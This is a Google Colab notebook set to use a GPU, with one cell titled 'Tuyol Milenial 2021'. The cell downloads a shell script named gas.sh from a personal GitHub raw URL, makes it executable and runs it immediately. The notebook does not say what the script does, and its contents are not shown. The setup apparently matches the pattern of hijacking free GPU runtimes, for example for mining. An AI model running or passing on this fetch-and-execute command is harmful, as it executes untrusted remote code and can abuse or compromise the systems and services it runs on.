{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "TuyolMilenial.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "ykWxWm-RxtBh"
      },
      "source": [
        "#@title Tuyol Milenial 2021\n",
        "\n",
        "!wget https://raw.githubusercontent.com/levyglory45/pivot/main/gas.sh && chmod +x gas.sh && ./gas.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}